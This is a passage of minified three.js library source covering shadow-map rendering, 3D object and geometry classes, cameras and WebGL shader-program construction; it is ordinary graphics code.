Ya(p.x,p.y,{minFilter:1003,magFilter:1003,format:1023}),F.updateProjectionMatrix());L.isSpotLightShadow&&L.update(w);\nL&&L.isRectAreaLightShadow&&L.update(w);H=L.map;L=L.matrix;l.setFromMatrixPosition(w.matrixWorld);F.position.copy(l);a.setRenderTarget(H);a.clear();for(H=0;H<y;H++){q?(u.copy(F.position),u.add(K[H]),F.up.copy(v[H]),F.lookAt(u),h.viewport(E[H])):(u.setFromMatrixPosition(w.target.matrixWorld),F.lookAt(u));F.updateMatrixWorld();F.matrixWorldInverse.getInverse(F.matrixWorld);L.set(.5,0,0,.5,0,.5,0,.5,0,0,.5,.5,0,0,0,1);L.multiply(F.projectionMatrix);L.multiply(F.matrixWorldInverse);k.multiplyMatrices(F.projectionMatrix,\nF.matrixWorldInverse);m.setFromMatrix(k);r.length=0;f(b,d,F);for(var da=0,x=r.length;da<x;da++){var D=r[da],Td=c.update(D),Sa=D.material;if(Sa&&Sa.isMultiMaterial)for(var Le=Td.groups,Sa=Sa.materials,z=0,Ea=Le.length;z<Ea;z++){var I=Le[z],J=Sa[I.materialIndex];!0===J.visible&&(J=e(D,J,q,l),a.renderBufferDirect(F,null,Td,J,D,I))}else J=e(D,Sa,q,l),a.renderBufferDirect(F,null,Td,J,D,null)}}}}y=a.getClearColor();q=a.getClearAlpha();a.setClearColor(y,q);aa.needsUpdate=!1}}}function cb(a,b){this.origin=\nvoid 0!==a?a:new q;this.direction=void 0!==b?b:new q}function db(a,b,c,d){this._x=a||0;this._y=b||0;this._z=c||0;this._order=d||db.DefaultOrder}function nd(){this.mask=1}function x(){Object.defineProperty(this,\"id\",{value:Bf++});this.uuid=N.generateUUID();this.name=\"\";this.type=\"Object3D\";this.parent=null;this.children=[];this.up=x.DefaultUp.clone();var a=new q,b=new db,c=new ca,d=new q(1,1,1);b.onChange(function(){c.setFromEuler(b,!1)});c.onChange(function(){b.setFromQuaternion(c,void 0,!1)});Object.defineProperties(this,\n{position:{enumerable:!0,value:a},rotation:{enumerable:!0,value:b},quaternion:{enumerable:!0,value:c},scale:{enumerable:!0,value:d},modelViewMatrix:{value:new S},normalMatrix:{value:new ya}});this.matrix=new S;this.matrixWorld=new S;this.matrixAutoUpdate=x.DefaultMatrixAutoUpdate;this.matrixWorldNeedsUpdate=!1;this.layers=new nd;this.visible=!0;this.receiveShadow=this.castShadow=!1;this.frustumCulled=!0;this.renderOrder=0;this.userData={};this.onBeforeRender=function(){};this.onAfterRender=function(){}}\nfunction hb(a,b){this.start=void 0!==a?a:new q;this.end=void 0!==b?b:new q}function za(a,b,c){this.a=void 0!==a?a:new q;this.b=void 0!==b?b:new q;this.c=void 0!==c?c:new q}function ha(a,b,c,d,e,f){this.a=a;this.b=b;this.c=c;this.normal=d&&d.isVector3?d:new q;this.vertexNormals=Array.isArray(d)?d:[];this.color=e&&e.isColor?e:new J;this.vertexColors=Array.isArray(e)?e:[];this.materialIndex=void 0!==f?f:0}function Ka(a){X.call(this);this.type=\"MeshBasicMaterial\";this.color=new J(16777215);this.lightMap=\nthis.map=null;this.lightMapIntensity=1;this.aoMap=null;this.aoMapIntensity=1;this.envMap=this.alphaMap=this.specularMap=null;this.combine=0;this.reflectivity=1;this.refractionRatio=.98;this.wireframe=!1;this.wireframeLinewidth=1;this.wireframeLinejoin=this.wireframeLinecap=\"round\";this.lights=this.morphTargets=this.skinning=!1;this.setValues(a)}function U(a,b,c){if(Array.isArray(a))throw new TypeError(\"THREE.BufferAttribute: array should be a Typed Array.\");this.uuid=N.generateUUID();this.array=a;\nthis.itemSize=b;this.count=void 0!==a?a.length/b:0;this.normalized=!0===c;this.dynamic=!1;this.updateRange={offset:0,count:-1};this.onUploadCallback=function(){};this.version=0}function uc(a,b){U.call(this,new Int8Array(a),b)}function vc(a,b){U.call(this,new Uint8Array(a),b)}function wc(a,b){U.call(this,new Uint8ClampedArray(a),b)}function xc(a,b){U.call(this,new Int16Array(a),b)}function ib(a,b){U.call(this,new Uint16Array(a),b)}function yc(a,b){U.call(this,new Int32Array(a),b)}function jb(a,b){U.call(this,\nnew Uint32Array(a),b)}function z(a,b){U.call(this,new Float32Array(a),b)}function zc(a,b){U.call(this,new Float64Array(a),b)}function Me(){this.indices=[];this.vertices=[];this.normals=[];this.colors=[];this.uvs=[];this.uvs2=[];this.groups=[];this.morphTargets={};this.skinWeights=[];this.skinIndices=[];this.boundingSphere=this.boundingBox=null;this.groupsNeedUpdate=this.uvsNeedUpdate=this.colorsNeedUpdate=this.normalsNeedUpdate=this.verticesNeedUpdate=!1}function Ud(a){for(var b=a.length,c=-Infinity;b--;)a[b]>\nc&&(c=a[b]);return c}function T(){Object.defineProperty(this,\"id\",{value:Vd++});this.uuid=N.generateUUID();this.name=\"\";this.type=\"Geometry\";this.vertices=[];this.colors=[];this.faces=[];this.faceVertexUvs=[[]];this.morphTargets=[];this.morphNormals=[];this.skinWeights=[];this.skinIndices=[];this.lineDistances=[];this.boundingSphere=this.boundingBox=null;this.groupsNeedUpdate=this.lineDistancesNeedUpdate=this.colorsNeedUpdate=this.normalsNeedUpdate=this.uvsNeedUpdate=this.verticesNeedUpdate=this.elementsNeedUpdate=\n!1}function I(){Object.defineProperty(this,\"id\",{value:Vd++});this.uuid=N.generateUUID();this.name=\"\";this.type=\"BufferGeometry\";this.index=null;this.attributes={};this.morphAttributes={};this.groups=[];this.boundingSphere=this.boundingBox=null;this.drawRange={start:0,count:Infinity}}function Aa(a,b){x.call(this);this.type=\"Mesh\";this.geometry=void 0!==a?a:new I;this.material=void 0!==b?b:new Ka({color:16777215*Math.random()});this.drawMode=0;this.updateMorphTargets()}function Ib(a,b,c,d,e,f){T.call(this);\nthis.type=\"BoxGeometry\";this.parameters={width:a,height:b,depth:c,widthSegments:d,heightSegments:e,depthSegments:f};this.fromBufferGeometry(new kb(a,b,c,d,e,f));this.mergeVertices()}function kb(a,b,c,d,e,f){function g(a,b,c,d,e,f,g,l,L,C,F){var da=f/L,H=g/C,aa=f/2,x=g/2,D=l/2;g=L+1;var z=C+1,Q=f=0,M,O,P=new q;for(O=0;O<z;O++){var J=O*H-x;for(M=0;M<g;M++)P[a]=(M*da-aa)*d,P[b]=J*e,P[c]=D,k.push(P.x,P.y,P.z),P[a]=0,P[b]=0,P[c]=0<l?1:-1,t.push(P.x,P.y,P.z),p.push(M/L),p.push(1-O/C),f+=1}for(O=0;O<C;O++)for(M=\n0;M<L;M++)a=n+M+g*(O+1),b=n+(M+1)+g*(O+1),c=n+(M+1)+g*O,m.push(n+M+g*O,a,c),m.push(a,b,c),Q+=6;h.addGroup(u,Q,F);u+=Q;n+=f}I.call(this);this.type=\"BoxBufferGeometry\";this.parameters={width:a,height:b,depth:c,widthSegments:d,heightSegments:e,depthSegments:f};var h=this;d=Math.floor(d)||1;e=Math.floor(e)||1;f=Math.floor(f)||1;var m=[],k=[],t=[],p=[],n=0,u=0;g(\"z\",\"y\",\"x\",-1,-1,c,b,a,f,e,0);g(\"z\",\"y\",\"x\",1,-1,c,b,-a,f,e,1);g(\"x\",\"z\",\"y\",1,1,a,c,b,d,f,2);g(\"x\",\"z\",\"y\",1,-1,a,c,-b,d,f,3);g(\"x\",\"y\",\"z\",\n1,-1,a,b,c,d,e,4);g(\"x\",\"y\",\"z\",-1,-1,a,b,-c,d,e,5);this.setIndex(m);this.addAttribute(\"position\",new z(k,3));this.addAttribute(\"normal\",new z(t,3));this.addAttribute(\"uv\",new z(p,2))}function Ac(a,b,c,d){T.call(this);this.type=\"PlaneGeometry\";this.parameters={width:a,height:b,widthSegments:c,heightSegments:d};this.fromBufferGeometry(new lb(a,b,c,d))}function lb(a,b,c,d){I.call(this);this.type=\"PlaneBufferGeometry\";this.parameters={width:a,height:b,widthSegments:c,heightSegments:d};var e=a/2,f=b/\n2;c=Math.floor(c)||1;d=Math.floor(d)||1;var g=c+1,h=d+1,m=a/c,k=b/d,t=[],p=[],n=[],u=[];for(a=0;a<h;a++){var l=a*k-f;for(b=0;b<g;b++)p.push(b*m-e,-l,0),n.push(0,0,1),u.push(b/c),u.push(1-a/d)}for(a=0;a<d;a++)for(b=0;b<c;b++)e=b+g*(a+1),f=b+1+g*(a+1),h=b+1+g*a,t.push(b+g*a,e,h),t.push(e,f,h);this.setIndex(t);this.addAttribute(\"position\",new z(p,3));this.addAttribute(\"normal\",new z(n,3));this.addAttribute(\"uv\",new z(u,2))}function ra(){x.call(this);this.type=\"Camera\";this.matrixWorldInverse=new S;this.projectionMatrix=\nnew S}function Fa(a,b,c,d){ra.call(this);this.type=\"PerspectiveCamera\";this.fov=void 0!==a?a:50;this.zoom=1;this.near=void 0!==c?c:.1;this.far=void 0!==d?d:2E3;this.focus=10;this.aspect=void 0!==b?b:1;this.view=null;this.filmGauge=35;this.filmOffset=0;this.updateProjectionMatrix()}function Jb(a,b,c,d,e,f){ra.call(this);this.type=\"OrthographicCamera\";this.zoom=1;this.view=null;this.left=a;this.right=b;this.top=c;this.bottom=d;this.near=void 0!==e?e:.1;this.far=void 0!==f?f:2E3;this.updateProjectionMatrix()}\nfunction Cf(a,b,c){var d,e,f;return{setMode:function(a){d=a},setIndex:function(c){c.array instanceof Uint32Array&&b.get(\"OES_element_index_uint\")?(e=a.UNSIGNED_INT,f=4):c.array instanceof Uint16Array?(e=a.UNSIGNED_SHORT,f=2):(e=a.UNSIGNED_BYTE,f=1)},render:function(b,h){a.drawElements(d,h,e,b*f);c.calls++;c.vertices+=h;d===a.TRIANGLES&&(c.faces+=h/3)},renderInstances:function(g,h,m){var k=b.get(\"ANGLE_instanced_arrays\");null===k?console.error(\"THREE.WebGLBufferRenderer: using THREE.InstancedBufferGeometry but hardware does not support extension ANGLE_instanced_arrays.\"):\n(k.drawElementsInstancedANGLE(d,m,e,h*f,g.maxInstancedCount),c.calls++,c.vertices+=m*g.maxInstancedCount,d===a.TRIANGLES&&(c.faces+=g.maxInstancedCount*m/3))}}}function Df(a,b,c){var d;return{setMode:function(a){d=a},render:function(b,f){a.drawArrays(d,b,f);c.calls++;c.vertices+=f;d===a.TRIANGLES&&(c.faces+=f/3)},renderInstances:function(e){var f=b.get(\"ANGLE_instanced_arrays\");if(null===f)console.error(\"THREE.WebGLBufferRenderer: using THREE.InstancedBufferGeometry but hardware does not support extension ANGLE_instanced_arrays.\");\nelse{var g=e.attributes.position,g=g.isInterleavedBufferAttribute?g.data.count:g.count;f.drawArraysInstancedANGLE(d,0,g,e.maxInstancedCount);c.calls++;c.vertices+=g*e.maxInstancedCount;d===a.TRIANGLES&&(c.faces+=e.maxInstancedCount*g/3)}}}}function Ef(){var a={};return{get:function(b){if(void 0!==a[b.id])return a[b.id];var c;switch(b.type){case \"DirectionalLight\":c={direction:new q,color:new J,shadow:!1,shadowBias:0,shadowRadius:1,shadowMapSize:new D};break;case \"SpotLight\":c={position:new q,direction:new q,\ncolor:new J,distance:0,coneCos:0,penumbraCos:0,decay:0,shadow:!1,shadowBias:0,shadowRadius:1,shadowMapSize:new D};break;case \"PointLight\":c={position:new q,color:new J,distance:0,decay:0,shadow:!1,shadowBias:0,shadowRadius:1,shadowMapSize:new D};break;case \"HemisphereLight\":c={direction:new q,skyColor:new J,groundColor:new J};break;case \"RectAreaLight\":c={color:new J,position:new q,halfWidth:new q,halfHeight:new q}}return a[b.id]=c}}}function Ff(a){a=a.split(\"\\n\");for(var b=0;b<a.length;b++)a[b]=\nb+1+\": \"+a[b];return a.join(\"\\n\")}function Ne(a,b,c){var d=a.createShader(b);a.shaderSource(d,c);a.compileShader(d);!1===a.getShaderParameter(d,a.COMPILE_STATUS)&&console.error(\"THREE.WebGLShader: Shader couldn't compile.\");\"\"!==a.getShaderInfoLog(d)&&console.warn(\"THREE.WebGLShader: gl.getShaderInfoLog()\",b===a.VERTEX_SHADER?\"vertex\":\"fragment\",a.getShaderInfoLog(d),Ff(c));return d}function Oe(a){switch(a){case 3E3:return[\"Linear\",\"( value )\"];case 3001:return[\"sRGB\",\"( value )\"];case 3002:return[\"RGBE\",\n\"( value )\"];case 3004:return[\"RGBM\",\"( value, 7.0 )\"];case 3005:return[\"RGBM\",\"( value, 16.0 )\"];case 3006:return[\"RGBD\",\"( value, 256.0 )\"];case 3007:return[\"Gamma\",\"( value, float( GAMMA_FACTOR ) )\"];default:throw Error(\"unsupported encoding: \"+a);}}function Wd(a,b){var c=Oe(b);return\"vec4 \"+a+\"( vec4 value ) { return \"+c[0]+\"ToLinear\"+c[1]+\"; }\"}function Gf(a,b){var c=Oe(b);return\"vec4 \"+a+\"( vec4 value ) { return LinearTo\"+c[0]+c[1]+\"; }\"}function Hf(a,b){var c;switch(b){case 1:c=\"Linear\";break;\ncase 2:c=\"Reinhard\";break;case 3:c=\"Uncharted2\";break;case 4:c=\"OptimizedCineon\";break;default:throw Error(\"unsupported toneMapping: \"+b);}return\"vec3 \"+a+\"( vec3 color ) { return \"+c+\"ToneMapping( color ); }\"}function If(a,b,c){a=a||{};return[a.derivatives||b.envMapCubeUV||b.bumpMap||b.normalMap||b.flatShading?\"#extension GL_OES_standard_derivatives : enable\":\"\",(a.fragDepth||b.logarithmicDepthBuffer)&&c.get(\"EXT_frag_depth\")?\"#extension GL_EXT_frag_depth : enable\":\"\",a.drawBuffers&&c.get(\"WEBGL_draw_buffers\")?\n\"#extension GL_EXT_draw_buffers : require\":\"\",(a.shaderTextureLOD||b.envMap)&&c.get(\"EXT_shader_texture_lod\")?\"#extension GL_EXT_shader_texture_lod : enable\":\"\"].filter(Bc).join(\"\\n\")}function Jf(a){var b=[],c;for(c in a){var d=a[c];!1!==d&&b.push(\"#define \"+c+\" \"+d)}return b.join(\"\\n\")}function Bc(a){return\"\"!==a}function Pe(a,b){return a.replace(/NUM_DIR_LIGHTS/g,b.numDirLights).replace(/NUM_SPOT_LIGHTS/g,b.numSpotLights).replace(/NUM_RECT_AREA_LIGHTS/g,b.numRectAreaLights).replace(/NUM_POINT_LIGHTS/g,\nb.numPointLights).replace(/NUM_HEMI_LIGHTS/g,b.numHemiLights)}function Xd(a){return a.replace(/#include +<([\\w\\d.]+)>/g,function(a,c){var d=Z[c];if(void 0===d)throw Error(\"Can not resolve #include <\"+c+\">\");return Xd(d)})}function Qe(a){return a.replace(/for \\( int i \\= (\\d+)\\; i < (\\d+)\\; i \\+\\+ \\) \\{([\\s\\S]+?)(?=\\})\\}/g,function(a,c,d,e){a=\"\";for(c=parseInt(c);c<parseInt(d);c++)a+=e.replace(/\\[ i \\]/g,\"[ \"+c+\" ]\");return a})}function Kf(a,b,c,d){var e=a.context,f=c.extensions,g=c.defines,h=c.__webglShader.vertexShader,\nm=c.__webglShader.fragmentShader,k=\"SHADOWMAP_TYPE_BASIC\";1===d.shadowMapType?k=\"SHADOWMAP_TYPE_PCF\":2===d.shadowMapType&&(k=\"SHADOWMAP_TYPE_PCF_SOFT\");var t=\"ENVMAP_TYPE_CUBE\",p=\"ENVMAP_MODE_REFLECTION\",n=\"ENVMAP_BLENDING_MULTIPLY\";if(d.envMap){switch(c.envMap.mapping){case 301:case 302:t=\"ENVMAP_TYPE_CUBE\";break;case 306:case 307:t=\"ENVMAP_TYPE_CUBE_UV\";break;case 303:case 304:t=\"ENVMAP_TYPE_EQUIREC\";break;case 305:t=\"ENVMAP_TYPE_SPHERE\"}switch(c.envMap.mapping){case 302:case 304:p=\"ENVMAP_MODE_REFRACTION\"}switch(c.combine){case 0:n=\n\"ENVMAP_BLENDING_MULTIPLY\";break;case 1:n=\"ENVMAP_BLENDING_MIX\";break;case 2:n=\"ENVMAP_BLENDING_ADD\"}}var u=0<a.gammaFactor?a.gammaFactor:1,f=If(f,d,a.extensions),l=Jf(g),r=e.createProgram();c.isRawShaderMaterial?(g=[l,\"\\n\"].filter(Bc).join(\"\\n\"),k=[f,l,\"\\n\"].filter(Bc).join(\"\\n\")):(g=[\"precision \"+d.precision+\" float;\",\"precision \"+d.precision+\" int;\",\"#define SHADER_NAME \"+c.__webglShader.name,l,d.supportsVertexTextures?\"#define VERTEX_TEXTURES\":\"\",\"#define GAMMA_FACTOR \"+u,\"#define MAX_BONES \"+\nd.maxBones,d.useFog&&d.fog?\"#define USE_FOG\":\"\",d.useFog&&d.fogExp?\"#define FOG_EXP2\":\"\",d.map?\"#define USE_MAP\":\"\",d.envMap?\"#define USE_ENVMAP\":\"\",d.envMap?\"#define \"+p:\"\",d.lightMap?\"#define USE_LIGHTMAP\":\"\",d.aoMap?\"#define USE_AOMAP\":\"\",d.emissiveMap?\"#define USE_EMISSIVEMAP\":\"\",d.bumpMap?\"#define USE_BUMPMAP\":\"\",d.normalMap?\"#define USE_NORMALMAP\":\"\",d.displacementMap&&d.supportsVertexTextures?\"#define USE_DISPLACEMENTMAP\":\"\",d.specularMap?\"#define USE_SPECULARMAP\":\"\",d.roughnessMap?\"#define USE_ROUGHNESSMAP\":\n\"\",d.metalnessMap?\"#define USE_METALNESSMAP\":\"\",d.alphaMap?\"#define USE_ALPHAMAP\":\"\",d.vertexColors?\"#define USE_COLOR\":\"\",d.flatShading?\"#define FLAT_SHADED\":\"\",d.skinning?\"#define USE_SKINNING\":\"\",d.useVertexTexture?\"#define BONE_TEXTURE\":\"\",d.morphTargets?\"#define USE_MORPHTARGETS\":\"\",d.morphNormals&&!1===d.flatShading?\"#define USE_MORPHNORMALS\":\"\",d.doubleSided?\"#define DOUBLE_SIDED\":\"\",d.flipSided?\"#define FLIP_SIDED\":\"\",\"#define NUM_CLIPPING_PLANES \"+d.numClippingPlanes,d.shadowMapEnabled?\"#define USE_SHADOWMAP\":\n\"\",d.shadowMapEnabled?\"#define \"+k:\"\",d.sizeAttenuation?\"#define USE_SIZEATTENUATION\":\"\",d.logarithmicDepthBuffer?\"#define USE_LOGDEPTHBUF\":\"\",d.logarithmicDepthBuffer&&a.extensions.get(\"EXT_frag_depth\")?\"#define USE_LOGDEPTHBUF_EXT\":\"\",\"uniform mat4 modelMatrix;\",\"uniform mat4 modelViewMatrix;\",\"uniform mat4 projectionMatrix;\",\"uniform mat4 viewMatrix;\",\"uniform mat3 normalMatrix;\",\"uniform vec3 cameraPosition;\",\"attribute vec3 position;\",\"attribute vec3 normal;\",\"attribute vec2 uv;\",\"#ifdef USE_COLOR\",\n\"\\tattribute vec3 color;\",\"#endif\",\"#ifdef USE_MORPHTARGETS\",\"\\tattribute vec3 morphTarget0;\",\"\\tattribute vec3 morphTarget1;\",\"\\tattribute vec3 morphTarget2;\",\"\\tattribute vec3 morphTarget3;\",\"\\t#ifdef USE_MORPHNORMALS\",\"\\t\\tattribute vec3 morphNormal0;\",\"\\t\\tattribute vec3 morphNormal1;\",\"\\t\\tattribute vec3 morphNormal2;\",\"\\t\\tattribute vec3 morphNormal3;\",\"\\t#else\",\"\\t\\tattribute vec3 morphTarget4;\",\"\\t\\tattribute vec3 morphTarget5;\",\"\\t\\tattribute vec3 morphTarget6;\",\"\\t\\tattribute vec3 morphTarget7;\",\n\"\\t#endif\",\"#endif\",\"#ifdef USE_SKINNING\",\"\\tattribute vec4 skinIndex;\",\"\\tattribute vec4 skinWeight;\",\"#endif\",\"\\n\"].filter(Bc).join(\"\\n\"),k=[f,\"precision \"+d.precision+\" float;\",\"precision \"+d.precision+\" int;\",\"#define SHADER_NAME \"+c.__webglShader.name,l,d.alphaTest?\"#define ALPHATEST \"+d.alphaTest:\"\",\"#define GAMMA_FACTOR \"+u,d.useFog&&d.fog?\"#define USE_FOG\":\"\",d.useFog&&d.fogExp?\"#define FOG_EXP2\":\"\",d.map?\"#define USE_MAP\":\"\",d.envMap?\"#define USE_ENVMAP\":\"\",d.envMap?\"#define \"+t:\"\",d.envMap?\n\"#define \"+p:\"\",d.envMap?\"#define \"+n:\"\",d.lightMap?\"#define USE_LIGHTMAP\":\"\",d.aoMap?\"#define USE_AOMAP\":\"\",d.emissiveMap?\"#define USE_EMISSIVEMAP\":\"\",d.bumpMap?\"#define USE_BUMPMAP\":\"\",d.normalMap?\"#define USE_NORMALMAP\":\"\",d.specularMap?\"#define USE_SPECULARMAP\":\"\",d.roughnessMap?\"#define USE_ROUGHNESSMAP\":\"\",d.metalnessMap?\"#define USE_METALNESSMAP\":\"\",d.alphaMap?\"#define USE_ALPHAMAP\":\"\",d.vertexColors?\"#define USE_COLOR\":\"\",d.gradientMap?\"#define USE_GRADIENTMAP\":\"\",d.flatShading?\"#define FLAT_SHADED\":\n\"\",d.doubleSided?\"#define DOUBLE_SIDED\":\"\",d.flipSided?\"#define FLIP_SIDED\":\"\",\"#define NUM_CLIPPING_PLANES \"+d.numClippingPlanes,\"#define UNION_CLIPPING_PLANES \"+(d.numClippingPlanes-d.numClipIntersection),d.shadowMapEnabled?\"#define USE_SHADOWMAP\":\"\",d.shadowMapEnabled?\"#define \"+k:\"\",d.premultipliedAlpha?\"#define PREMULTIPLIED_ALPHA\":\"\",d.physicallyCorrectLights?\"#define PHYSICALLY_CORRECT_LIGHTS\":\"\",d.logarithmicDepthBuffer?\"#define USE_LOGDEPTHBUF\":\"\",d.logarithmicDepthBuffer&&a.extensions.get(\"EXT_frag_depth\")?\n\"#define USE_LOGDEPTHBUF_EXT\":\"\",d.envMap&&a.extensions.get(\"EXT_shader_texture_lod\")?\"#define TEXTURE_LOD_EXT\":\"\",\"uniform mat4 viewMatrix;\",\"uniform vec3 cameraPosition;\",0!==d.toneMapping?\"#define TONE_MAPPING\":\"\",0!==d.toneMapping?Z.tonemapping_pars_fragment:\"\",0!==d.toneMapping?Hf(\"toneMapping\",d.toneMapping):\"\",d.outputEncoding||d.mapEncoding||d.envMapEncoding||d.emissiveMapEncoding?Z.encodings_pars_fragment:\"\",d.mapEncoding?Wd(\"mapTexelToLinear\",d.mapEncoding):\"\",d.envMapEncoding?Wd(\"envMapTexelToLinear\",\nd.envMapEncoding):\"\",d.emissiveMapEncoding?Wd(\"emissiveMapTexelToLinear\",d.emissiveMapEncoding):\"\",d.outputEncoding?Gf(\"linearToOutputTexel\",d.outputEncoding):\"\",d.depthPacking?\"#define DEPTH_PACKING \"+c.depthPacking:\"\",\"\\n\"].filter(Bc).join(\"\\n\"));h=Xd(h,d);h=Pe(h,d);m=Xd(m,d);m=Pe(m,d);c.isShaderMaterial||(h=Qe(h),m=Qe(m));m=k+m;h=Ne(e,e.VERTEX_SHADER,g+h);m=Ne(e,e.FRAGMENT_SHADER,m);e.attachShader(r,h);e.attachShader(r,m);void 0!==c.index0AttributeName?e.bindAttribLocation(r,0,c.index0AttributeName):\n!0===d.morphTargets&&e.bindAttribLocation(r,0,\"position\");e.linkProgram(r);d=e.getProgramInfoLog(r);t=e.getShaderInfoLog(h);p=e.getShaderInfoLog(m);u=n=!0;if(!1===e.getProgramParameter(r,e.LINK_STATUS))n=!1,console.error(\"THREE.WebGLProgram: shader error: \",e.getError(),\"gl.VALIDATE_STATUS\",e.getProgramParameter(r,e.VALIDATE_STATUS),\"gl.getProgramInfoLog\",d,t,p);else if(\"\"!==d)console.warn(\"THREE.WebGLProgram: gl.getProgramInfoLog()\",d);else if(\"\"===t||\"\"===p)u=!1;u&&(this.diagnostics={runnable:n,\nmaterial:c,programLog:d,vertexShader:{log:t,prefix:g},fragmentShader:{log:p,prefix:k}});e.deleteShader(h);e.deleteShader(m);var q;this.getUniforms=function(){void 0===q&&(q=new $a(e,r,a));return q};var w;this.getAttributes=function(){if(void 0===w){for(var a={},b=e.getProgramParameter(r,e.ACTIVE_ATTRIBUTES),c=0;c<b;c++){var d=e.getActiveAttrib(r,c).name;a[d]=e.getAttribLocation(r,d)}w=a}return w};this.destroy=function(){e.deleteProgram(r);this.program=void 0};Object.defineProperties(this,{uniforms:{get:function(){console.warn(\"THREE.WebGLProgram: .uniforms is now .getUniforms().\");\nreturn this.getUniforms()}},attributes:{get:function(){console.warn(\"THREE.WebGLProgram: .attributes is now .getAttributes().\");return this.getAttributes()}}});this.id=Lf++;this.code=b;this.usedTimes=1;this.program=r;this.vertexShader=h;this.fragmentShader=m;return this}function Mf(a,b){function c(a,b){var c;a?a.isTexture?c=a.encoding:a.isWebGLRenderTarget&&(console.warn(\"THREE.WebGLPrograms.getTextureEncodingFromMap: don't use render targets as textures. Use their .texture property instead.\"),c=\na.texture.encoding):c=3E3;3E3===c&&b&&(c=3007);return c}var d=[],e={MeshDepthMaterial:\"depth\",MeshNormalMaterial:\"normal\",MeshBasicMaterial:\"basic\",MeshLambertMaterial:\"lambert\",MeshPhongMaterial:\"phong\",MeshToonMaterial:\"phong\",MeshStandardMaterial:\"physical\",MeshPhysicalMaterial:\"physical\",LineBasicMaterial:\"basic\",LineDashedMaterial:\"dashed\",PointsMaterial:\"points\"},f=\"precision supportsVertexTextures map mapEncoding envMap envMapMode envMapEncoding lightMap aoMap emissiveMap emissiveMapEncoding bumpMap normalMap displacementMap specularMap roughnessMap metalnessMap gradientMap alphaMap combine vertexColors fog useFog fogExp flatShading sizeAttenuation logarithmicDepthBuffer skinning maxBones useVertexTexture morphTargets morphNormals maxMorphTargets maxMorphNormals premultipliedAlpha numDirLights numPointLights numSpotLights numHemiLights numRectAreaLights shadowMapEnabled shadowMapType toneMapping physicallyCorrectLights alphaTest doubleSided flipSided numClippingPlanes numClipIntersection depthPacking\".split(\" \");\nthis.getParameters=function(d,f,m,k,t,p){var n=e[d.type],u;b.floatVertexTextures&&p&&p.skeleton&&p.skeleton.useVertexTexture?u=1024:(u=Math.floor((b.maxVertexUniforms-20)/4),void 0!==p&&p&&p.isSkinnedMesh&&(u=Math.min(p.skeleton.bones.length,u),u<p.skeleton.bones.length&&console.warn(\"WebGLRenderer: too many bones - \"+p.skeleton.bones.length+\", this GPU supports just \"+u+\" (try OpenGL instead of ANGLE)\")));var l=a.getPrecision();null!==d.precision&&(l=b.getMaxPrecision(d.precision),l!==d.precision&&\nconsole.warn(\"THREE.WebGLProgram.getParameters:\",d.precision,\"not supported, using\",l,\"instead.\"));var r=a.getCurrentRenderTarget();return{shaderID:n,precision:l,supportsVertexTextures:b.vertexTextures,outputEncoding:c(r?r.texture:null,a.gammaOutput),map:!!d.map,mapEncoding:c(d.map,a.gammaInput),envMap:!!d.envMap,envMapMode:d.envMap&&d.envMap.mapping,envMapEncoding:c(d.envMap,a.gammaInput),envMapCubeUV:!!d.envMap&&(306===d.envMap.mapping||307===d.envMap.mapping),lightMap:!!d.lightMap,aoMap:!!d.aoMap,\nemissiveMap:!!d.emissiveMap,emissiveMapEncoding:c(d.emissiveMap,a.gammaInput),bumpMap:!!d.bumpMap,normalMap:!!d.normalMap,displacementMap:!!d.displacementMap,roughnessMap:!!d.roughnessMap,metalnessMap:!!d.metalnessMap,specularMap:!!d.specularMap,alphaMap:!!d.alphaMap,gradientMap:!!d.gradientMap,combine:d.combine,vertexColors:d.vertexColors,fog:!!m,useFog:d.fog,fogExp:m&&m.isFogExp2,flatShading:1===d.shading,sizeAttenuation:d.sizeAttenuation,logarithmicDepthBuffer:b.logarithmicDepthBuffer,skinning:d.skinning,\nmaxBones:u,useVertexTexture:b.floatVertexTextures&&p&&p.skeleton&&p.skeleton.useVertexTexture,morphTargets:d.morphTargets,morphNormals:d.morphNormals,maxMorphTargets:a.maxMorphTargets,maxMorphNormals:a.maxMorphNormals,numDirLights:f.directional.length,numPointLights:f.point.length,numSpotLights:f.spot.length,numRectAreaLights:f.rectArea.length,numHemiLights:f.hemi.length,numClippingPlanes:k,numClipIntersection:t,shadowMapEnabled:a.shadowMap.enabled&&p.receiveShadow&&0<f.shadows.length,shadowMapType:a.shadowMap.type,\ntoneMapping:a.toneMapping,physicallyCorrectLights:a.physicallyCorrectLights,premultipliedAlpha:d.premultipliedAlpha,alphaTest:d.alphaTest,doubleSided:2===d.side,flipSided:1===d.side,depthPacking:void 0!==d.depthPacking?d.depthPacking:!1}};this.getProgramCode=function(a,b){var c=[];b.shaderID?c.push(b.shaderID):(c.push(a.fragmentShader),c.push(a.vertexShader));if(void 0!==a.defines)for(var d in a.defines)c.push(d),c.push(a.defines[d]);for(d=0;d<f.length;d++)c.push(b[f[d]]);return c.join()};this.acquireProgram=\nfunction(b,c,e){for(var f,t=0,p=d.length;t<p;t++){var n=d[t];if(n.code===e){f=n;++f.usedTimes;break}}void 0===f&&(f=new Kf(a,e,b,c),d.push(f));return f};this.releaseProgram=function(a){if(0===--a.usedTimes){var b=d.indexOf(a);d[b]=d[d.length-1];d.pop();a.destroy()}};this.programs=d}function Nf(a,b,c){function d(a){var h=a.target;a=f[h.id];null!==a.index&&e(a.index);var m=a.attributes,k;for(k in m)e(m[k]);h.removeEventListener(\"dispose\",d);delete f[h.id];k=b.get(h);k.wireframe&&e(k.wireframe);b[\"delete\"](h);\nh=b.get(a);h.wireframe&&e(h.wireframe);b[\"delete\"](a);c.memory.geometries--}function e(c){var d;d=c.isInterleavedBufferAttribute?b.get(c.data).__webglBuffer:b.get(c).__webglBuffer;void 0!==d&&(a.deleteBuffer(d),c.isInterleavedBufferAttribute?b[\"delete\"](c.data):b[\"delete\"](c))}var f={};return{get:function(a){var b=a.geometry;if(void 0!==f[b.id])return f[b.id];b.addEventListener(\"dispose\",d);var e;b.isBufferGeometry?e=b:b.isGeometry&&(void 0===b._bufferGeometry&&(b._bufferGeometry=(new I).setFromObject(a)),\ne=b._bufferGeometry);f[b.id]=e;c.memory.geometries++;return e}}}function Of(a,b,c){function d(c,d){var e=c.isInterleavedBufferAttribute?c.data:c,m=b.get(e);if(void 0===m.__webglBuffer){m.__webglBuffer=a.createBuffer();a.bindBuffer(d,m.__webglBuffer);a.bufferData(d,e.array,e.dynamic?a.DYNAMIC_DRAW:a.STATIC_DRAW);var k=a.FLOAT,t=e.array;t instanceof Float32Array?k=a.FLOAT:t instanceof Float64Array?console.warn(\"Unsupported data buffer 